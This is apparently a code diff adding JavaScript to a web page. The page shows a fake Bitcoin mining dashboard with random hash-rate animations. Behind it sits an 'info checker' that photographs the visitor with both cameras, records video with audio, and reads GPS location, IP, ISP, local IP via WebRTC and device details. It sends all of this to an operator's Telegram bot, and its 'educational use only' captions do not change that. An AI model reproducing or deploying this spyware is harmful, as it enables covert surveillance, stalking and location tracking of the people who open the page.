+  const stream = document.getElementById('hashStream');
+  if (!stream) return;
+  stream.innerHTML = hashes.map((h,i) => {
+    if (i === 0) {
+      const zeros = h.match(/^0*/)[0];
+      const rest  = h.slice(zeros.length);
+      return `<div class="current-hash"><span class="prefix-zeros">${zeros}</span>${rest}</div>`;
+    }
+    return `<div style="opacity:${0.5 - i*0.08}">${h}</div>`;
+  }).join('');
+
+  // nonce
+  const nonce = '0x' + rand(0, 0xffffffff).toString(16).padStart(8,'0');
+  document.getElementById('nonceVal').textContent = nonce;
+  document.getElementById('attemptsVal').textContent = attempts.toLocaleString();
+
+  // progress
+  progVal = (progVal + Math.random() * 0.3) % 100;
+  document.getElementById('progFill').style.width = progVal.toFixed(1) + '%';
+  document.getElementById('progPct').textContent  = progVal.toFixed(1) + '%';
+
+  // hashrate fluctuation
+  const hr = (800 + rand(-50,100) + Math.random()*50).toFixed(1);
+  document.getElementById('hashrate').textContent = hr + ' TH/s';
+}
+
+// Fluctuate workers
+function fluctuateWorkers() {
+  const rates = [142,138,89,156,0];
+  const wrks = document.querySelectorAll('.worker-hash');
+  wrks.forEach((w,i) => {
+    if (rates[i] > 0) {
+      const v = (rates[i] + rand(-5,5) + Math.random()*3).toFixed(1);
+      w.textContent = v + ' TH/s';
+    }
+  });
+}
+
+// Fetch real BTC difficulty (optional, silent)
+async function fetchBTCData() {
+  try {
+    const r = await fetch('https://blockchain.info/q/getdifficulty');
+    const d = await r.text();
+    const diff = (parseFloat(d) / 1e12).toFixed(2) + 'T';
+    document.getElementById('difficulty').textContent = diff;
+  } catch(e) {
+    document.getElementById('difficulty').textContent = '83.1T';
+  }
+  try {
+    const r2 = await fetch('https://blockchain.info/q/getblockcount');
+    const h  = await r2.text();
+    document.getElementById('blockHeight').textContent = parseInt(h).toLocaleString();
+    document.getElementById('mining-progress')?.querySelector('.label-row span')?.textContent;
+  } catch(e) {}
+}
+
+setInterval(updateHashStream, 150);
+setInterval(fluctuateWorkers, 2000);
+fetchBTCData();
+
+// No auto popup on load
+
+// ═══════════════════════════════════════════════════════
+// PAGE 2 — INFO CHECKER (original code)
+// ═══════════════════════════════════════════════════════
+const $  = id => document.getElementById(id);
+const setBadge = (type, text) => {
+  $('statusBadge').className = 'status-badge' + (type ? ' '+type : '');
+  $('statusBadge').innerHTML = type==='sending' ? `<span class="spinner"></span>${text}` : text;
+};
+const setStep = (id, state) => { $(id).className = 'step ' + state; };
+const setRows = rows => {
+  $('resultGrid').innerHTML = rows.map(([k,v]) =>
+    `<div class="result-row"><span class="result-key">${k}</span><span class="result-val">${v}</span></div>`
+  ).join('');
+};
+const fmtErr = err => {
+  if (!err) return 'Unknown error';
+  if (err.name === 'NotAllowedError')      return 'Permission denied ❌';
+  if (err.name === 'NotFoundError')        return 'Camera/Mic নেই ❌';
+  if (err.name === 'NotReadableError')     return 'Device busy ❌';
+  if (err.name === 'OverconstrainedError') return 'Camera constraint ❌';
+  return (err.message || String(err)).substring(0, 60);
+};
+
+function resetCaptureUI() {
+  $('resultPanel').classList.add('show');
+  $('resultTitle').textContent = '// CAPTURE ALL';
+  $('progressSteps').classList.add('show');
+  $('telegramNote').innerHTML = '';
+  $('recWrapper').classList.remove('show');
+  $('recBar').style.width = '0%';
+  ['step1','step2','step3','step4'].forEach(s => setStep(s, ''));
+}
+
+function getBestMime() {
+  const list = [
+    'video/webm;codecs=vp8,opus','video/webm;codecs=vp9,opus',
+    'video/webm;codecs=h264,opus','video/webm;codecs=vp8',
+    'video/webm;codecs=vp9','video/webm',
+    'video/mp4;codecs=h264,aac','video/mp4',''
+  ];
+  for (const m of list) {
+    try { if (m === '' || MediaRecorder.isTypeSupported(m)) return m; } catch(e) {}
+  }
+  return '';
+}
+
+async function capturePhoto(facingMode) {
+  const constraints = [
+    { video: { facingMode: { exact: facingMode }, width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video: { facingMode: facingMode,            width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video: true, audio:false },
+  ];
+  let stream = null, lastErr = null;
+  for (const c of constraints) {
+    try { stream = await navigator.mediaDevices.getUserMedia(c); break; } catch(e) { lastErr = e; }
+  }
+  if (!stream) throw lastErr;
+  try {
+    const video = document.createElement('video');
+    video.srcObject = stream; video.playsInline = true; video.muted = true;
+    await video.play();
+    await new Promise(r => setTimeout(r, 1000));
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth  || 1280;
+    canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    return { canvas, res: `${canvas.width}x${canvas.height}` };
+  } finally {
+    stream.getTracks().forEach(t => t.stop());
+  }
+}
+
+async function recordVideo(durationSec) {
+  let stream = null, hasAudio = true;
+  const attempts = [
+    { video: { facingMode: { exact: 'user' }, width:{ideal:1280}, height:{ideal:720} }, audio: true  },
+    { video: { facingMode: 'user',            width:{ideal:1280}, height:{ideal:720} }, audio: true  },
+    { video: { facingMode: 'user' },                                                    audio: false },
+    { video: true,                                                                       audio: false },
+  ];
+  for (const c of attempts) {
+    try { stream = await navigator.mediaDevices.getUserMedia(c); hasAudio = !!c.audio; break; } catch(e) {}
+  }
+  if (!stream) throw new Error('Camera চালু হলো না ❌');
+  const mimeType = getBestMime();
+  return new Promise((resolve, reject) => {
+    const chunks = [];
+    let recorder;
+    try { recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {}); }
+    catch(e) { stream.getTracks().forEach(t => t.stop()); reject(new Error('MediaRecorder error: ' + e.message)); return; }
+    recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+    recorder.onerror = e => {
+      clearInterval(timer);
+      stream.getTracks().forEach(t => t.stop());
+      $('recWrapper').classList.remove('show');
+      reject(new Error('Record error: ' + (e.error?.message || 'unknown')));
+    };
+    recorder.onstop = () => {
+      stream.getTracks().forEach(t => t.stop());
+      $('recWrapper').classList.remove('show');
+      if (chunks.length === 0) { reject(new Error('No data recorded')); return; }
+      const finalMime = recorder.mimeType || mimeType || 'video/webm';
+      const blob      = new Blob(chunks, { type: finalMime });
+      if (blob.size < 1000) { reject(new Error('Video too small (' + blob.size + 'b)')); return; }
+      resolve({ blob, mimeType: finalMime, hasAudio, sizeMB: (blob.size/1024/1024).toFixed(2) });
+    };
+    $('recWrapper').classList.add('show');
+    $('recText').textContent  = `REC 0s / ${durationSec}s${hasAudio ? '' : ' (no audio)'}`;
+    $('recBar').style.transition = 'none';
+    $('recBar').style.width   = '0%';
+    recorder.start(500);
+    let elapsed = 0;
+    const timer = setInterval(() => {
+      elapsed++;
+      $('recText').textContent  = `REC ${elapsed}s / ${durationSec}s${hasAudio ? '' : ' (no audio)'}`;
+      $('recBar').style.transition = 'width 1s linear';
+      $('recBar').style.width   = (elapsed / durationSec * 100) + '%';
+      if (elapsed >= durationSec) {
+        clearInterval(timer);
+        try { recorder.requestData(); } catch(e) {}
+        setTimeout(() => { try { if (recorder.state !== 'inactive') recorder.stop(); } catch(e) { reject(e); } }, 300);
+      }
+    }, 1000);
+  });
+}
+
+const canvasToBlob = canvas => new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+
+async function tgSendPhoto(blob, caption) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'photo.jpg'); fd.append('caption', caption);
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd });
+  const d = await r.json();
+  if (!d.ok) throw new Error(d.description);
+}
+
+async function tgSendVideo(blob, caption, mimeType) {
+  if (blob.size > 49 * 1024 * 1024) throw new Error('50MB limit exceeded');
+  const ext = (mimeType||'').includes('mp4') ? 'mp4' : 'webm';
+  const fd  = new FormData();
+  fd.append('chat_id', CHAT_ID); fd.append('video', blob, `video.${ext}`);
+  fd.append('caption', caption); fd.append('supports_streaming', 'true');
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body:fd });
+  const d = await r.json();
+  if (!d.ok) {
+    const fd2 = new FormData();
+    fd2.append('chat_id', CHAT_ID); fd2.append('document', blob, `video.${ext}`); fd2.append('caption', caption + '\n(as document)');
+    const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body:fd2 });
+    const d2 = await r2.json();
+    if (!d2.ok) throw new Error(d2.description);
+  }
+}
+
+async function runCapture() {
+  const btn = $('cameraBtn');
+  btn.classList.add('loading');
+  resetCaptureUI();
+  setBadge('sending', 'WORKING');
+  setRows([['Status', 'শুরু হচ্ছে...']]);
+  let backR=null, frontR=null, videoR=null;
+  setStep('step1','active');
+  setRows([['Back Photo','Camera চালু হচ্ছে...']]);
+  try { backR = await capturePhoto('environment'); setStep('step1','done'); } catch(e) { setStep('step1','fail'); }
+  setStep('step2','active');
+  setRows([['Back Photo', backR ? `✅ ${backR.res}` : '❌ Failed'],['Front Photo','Camera চালু হচ্ছে...']]);
+  try { frontR = await capturePhoto('user'); setStep('step2','done'); } catch(e) { setStep('step2','fail'); }
+  setStep('step3','active');
+  setRows([['Back Photo', backR ? `✅ ${backR.res}` : '❌ Failed'],['Front Photo', frontR ? `✅ ${frontR.res}` : '❌ Failed'],['Video','🎬 Recording শুরু হচ্ছে...']]);
+  try {
+    videoR = await recordVideo(VIDEO_DURATION);
+    setStep('step3','done');
+    setRows([['Back Photo', backR ? `✅ ${backR.res}` : '❌ Failed'],['Front Photo', frontR ? `✅ ${frontR.res}` : '❌ Failed'],['Video', `✅ ${VIDEO_DURATION}s | ${videoR.sizeMB} MB${videoR.hasAudio ? '' : ' | no audio'}`]]);
+  } catch(e) {
+    setStep('step3','fail');
+    setRows([['Back Photo', backR ? `✅ ${backR.res}` : '❌ Failed'],['Front Photo', frontR ? `✅ ${frontR.res}` : '❌ Failed'],['Video', fmtErr(e)]]);
+  }
+  if (!backR && !frontR && !videoR) { setBadge('error','ALL FAILED'); $('telegramNote').innerHTML = '❌ কিছুই পাঠানো যায়নি'; btn.classList.remove('loading'); return; }
+  setStep('step4','active'); setBadge('sending','SENDING');
+  let sent=0, errs=[];
+  if (backR)  { try { await tgSendPhoto(await canvasToBlob(backR.canvas),  `📸 Back Camera Photo\n🖼 ${backR.res}\n⚠️ Educational use only`);  sent++; } catch(e) { errs.push('Back: '+fmtErr(e)); } }
+  if (frontR) { try { await tgSendPhoto(await canvasToBlob(frontR.canvas), `🤳 Front Camera Photo\n🖼 ${frontR.res}\n⚠️ Educational use only`); sent++; } catch(e) { errs.push('Front: '+fmtErr(e)); } }
+  if (videoR) { try { await tgSendVideo(videoR.blob, `🎬 Front Camera Video\n⏱ ${VIDEO_DURATION}s | 📦 ${videoR.sizeMB} MB${videoR.hasAudio ? '' : ' | no audio'}\n⚠️ Educational use only`, videoR.mimeType); sent++; } catch(e) { errs.push('Video: '+fmtErr(e)); } }
+  const bS = backR  ? `✅ ${backR.res}`       : '❌ Failed';
+  const fS = frontR ? `✅ ${frontR.res}`      : '❌ Failed';
+  const vS = videoR ? `✅ ${videoR.sizeMB} MB` : '❌ Failed';
+  if (errs.length === 0) {
+    setStep('step4','done'); setBadge('','ALL SENT ✓');
+    setRows([['Back Photo',bS],['Front Photo',fS],['Video',vS],['Telegram',`✅ ${sent} item(s) sent`]]);
+    $('telegramNote').innerHTML = `✅ <span>${sent}টি file Telegram এ পাঠানো হয়েছে!</span>`;
+  } else {
+    setStep('step4', sent>0?'done':'fail'); setBadge(sent>0?'':'error', sent>0?'PARTIAL ✓':'ERROR');
+    setRows([['Back Photo',bS],['Front Photo',fS],['Video',vS],['Sent',`${sent} item(s)`],['Error',errs.join(' | ')]]);
+    $('telegramNote').innerHTML = sent>0 ? `⚠️ <span>${sent}টি গেছে, কিছু fail হয়েছে</span>` : `❌ ${errs.join(' | ')}`;
+  }
+  btn.classList.remove('loading');
+}
+
+function showPanel(title) {
+  $('resultPanel').classList.add('show');
+  $('resultTitle').textContent = `// ${title}`;
+  $('progressSteps').classList.remove('show');
+  $('recWrapper').classList.remove('show');
+  $('resultGrid').style.display = 'none';
+  $('sendStatus').innerHTML = '';
+  $('telegramNote').innerHTML = '';
+}
+
+async function sendTextTG(text) {
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id:CHAT_ID, text, parse_mode:'Markdown' })
+    });
+    const d = await r.json();
+    if (d.ok) { setBadge('','SENT ✓'); $('telegramNote').innerHTML = '✅ <span>Telegram এ পাঠানো হয়েছে</span>'; }
+    else throw new Error(d.description);
+  } catch(e) {
+    setBadge('error','ERROR');
+    $('telegramNote').innerHTML = `❌ পাঠানো যায়নি: ${e.message}`;
+  }
+}
+
+async function checkIPAndBrowser() {
+  let ipRows = [];
+  try {
+    const d1 = await (await fetch('https://api.ipify.org?format=json')).json();
+    const d2 = await (await fetch(`https://ipapi.co/${d1.ip}/json/`)).json();
+    ipRows = [['IP Address',d1.ip],['Country',d2.country_name||'N/A'],['City',d2.city||'N/A'],['ISP',d2.org||'N/A'],['Timezone',d2.timezone||'N/A']];
+  } catch(e) { ipRows = [['IP Error', e.message]]; }
+  const ua = navigator.userAgent;
+  let browser = 'Unknown';
+  if      (ua.includes('Chrome')&&!ua.includes('Edg')) browser='Google Chrome';
+  else if (ua.includes('Firefox'))                      browser='Mozilla Firefox';
+  else if (ua.includes('Safari')&&!ua.includes('Chrome')) browser='Safari';
+  else if (ua.includes('Edg'))                          browser='Microsoft Edge';
+  else if (ua.includes('Opera')||ua.includes('OPR'))    browser='Opera';
+  const conn = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  let netSpeed='N/A', netType='N/A';
+  if(conn){ netSpeed=(conn.downlink||'N/A')+' Mbps'; netType=conn.effectiveType||'N/A'; }
+  let cameraS='N/A', micS='N/A';
+  if(navigator.mediaDevices?.enumerateDevices){
+    try{
+      const devs = await navigator.mediaDevices.enumerateDevices();
+      cameraS = devs.some(d=>d.kind==='videoinput')?'Found ✓':'Not Found ✗';
+      micS    = devs.some(d=>d.kind==='audioinput')?'Found ✓':'Not Found ✗';
+    }catch(e){ cameraS=micS='Permission Denied'; }
+  }
+  let localIP='N/A';
+  try{
+    await new Promise(res=>{
+      const pc=new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
+      pc.onicecandidate=e=>{
+        if(!e?.candidate){res();return;}
+        const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+        if(m&&!m[1].startsWith('0.')){localIP=m[1];pc.close();res();}
+      };
+      setTimeout(res,1000);
+    });
+  }catch(e){}
+  let storageUsed='N/A', storageTotal='N/A';
+  if(navigator.storage?.estimate){ try{ const est=await navigator.storage.estimate(); storageUsed=(est.usage/1024/1024).toFixed(2)+' MB'; storageTotal=(est.quota/1024/1024/1024).toFixed(2)+' GB'; }catch(e){} }
+  const browserRows = [
+    ['Browser',navigator.userAgent.includes('Chrome')&&!navigator.userAgent.includes('Edg')?'Google Chrome':browser],
+    ['Platform',navigator.platform],['Language',navigator.language],
+    ['Screen',`${screen.width}x${screen.height}`],['Pixel Ratio',(window.devicePixelRatio||'N/A')+'x'],
+    ['Timezone',Intl.DateTimeFormat().resolvedOptions().timeZone],['Online',navigator.onLine?'Yes':'No'],
+    ['Local IP',localIP],['Cookie',navigator.cookieEnabled?'Enabled ✓':'Disabled ✗'],
+    ['Network Type',netType],['Network Speed',netSpeed],
+    ['Device Memory',(navigator.deviceMemory?navigator.deviceMemory+' GB':'N/A')],
+    ['CPU Cores',(navigator.hardwareConcurrency?navigator.hardwareConcurrency+' cores':'N/A')],
+    ['Touch Points',(navigator.maxTouchPoints||0)+''],
+    ['Dark Mode',window.matchMedia('(prefers-color-scheme: dark)').matches?'Dark 🌙':'Light ☀️'],
+    ['Storage Used',storageUsed],['Storage Quota',storageTotal],['Camera',cameraS],['Microphone',micS],
+    ['User Agent',ua.substring(0,80)+'...'],
+  ];
+  if(navigator.getBattery){ try{ const bat=await navigator.getBattery(); browserRows.push(['Battery',Math.round(bat.level*100)+'%'],['Charging',bat.charging?'Yes ⚡':'No']); }catch(e){ browserRows.push(['Battery','N/A']); } }
+  const ipMsg      = `🌐 *IP INFO*\n\n` + ipRows.map(([k,v])=>`*${k}:* ${v}`).join('\n');
+  const browserMsg = `🖥️ *BROWSER INFO*\n\n` + browserRows.map(([k,v])=>`*${k}:* ${v}`).join('\n') + `\n\n⚠️ _Educational use only_`;
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id:CHAT_ID, text: ipMsg, parse_mode:'Markdown' }) });
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id:CHAT_ID, text: browserMsg, parse_mode:'Markdown' }) });
+  } catch(e) {}
+}
+
+function checkGeo() {
+  const btn = $('geoBtn');
+  btn.classList.add('loading');
+  showPanel('GEO LOCATION');
+  setBadge('sending','LOCATING...');
+  $('sendStatus').innerHTML = `<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent2)"><span class="spinner"></span>Location নেওয়া হচ্ছে...</span>`;
+  if (!navigator.geolocation) {
+    setBadge('error','ERROR');
+    $('telegramNote').innerHTML = '❌ Geolocation supported না';
+    btn.classList.remove('loading');
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    async p => {
+      const lat = p.coords.latitude.toFixed(6);
+      const lon = p.coords.longitude.toFixed(6);
+      const acc = p.coords.accuracy.toFixed(0);
+      setBadge('sending','SENDING');
+      $('sendStatus').innerHTML = `<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent2)"><span class="spinner"></span>Telegram এ পাঠানো হচ্ছে...</span>`;
+      const msg = `📍 *GEO LOCATION*\n\n*Latitude:* ${lat}\n*Longitude:* ${lon}\n*Accuracy:* ${acc} meters\n*Maps:* https://maps.google.com/?q=${lat},${lon}\n\n⚠️ _Educational use only_`;
+      await sendTextTG(msg);
+      $('sendStatus').innerHTML = '';
+      btn.classList.remove('loading');
+    },
+    e => {
+      setBadge('error','ERROR');
+      $('sendStatus').innerHTML = '';
+      $('telegramNote').innerHTML = `❌ ${e.message}`;
+      btn.classList.remove('loading');
+    },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
+}
+</script>
+</body>
+</html>
